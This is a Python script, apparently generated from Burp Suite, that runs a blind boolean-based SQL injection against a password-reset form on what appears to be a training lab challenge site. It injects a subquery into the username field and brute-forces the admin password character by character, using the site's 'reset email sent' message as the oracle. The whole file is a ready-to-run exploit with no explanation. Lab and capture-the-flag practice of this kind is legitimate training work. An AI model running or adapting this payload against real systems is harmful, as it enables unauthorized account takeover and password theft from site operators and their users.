import requests
import string
charlist=list(string.ascii_lowercase+string.ascii_uppercase+string.digits+string.punctuation)
passlist=[]

for i in range(1,20):
    for char in charlist:
        burp0_url = "https://livelabs.0x4148.com:443/challenges/error_based_01/"
        burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "https://livelabs.0x4148.com", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://livelabs.0x4148.com/challenges/error_based_01/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
        burp0_data = {"username": "admin' AND (SELECT 'z' FROM users where username='admin' AND substring(password,{},1)='{}' limit 1)='z".format(i,char), "reset_password": ''}
        response=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        print("Trying...",burp0_data["username"])
        if "A password reset email has been sent" in response.text:
            print("valid char : ",char)
            passlist.append(char)
            break
password=''.join(passlist)
print("password = ",password)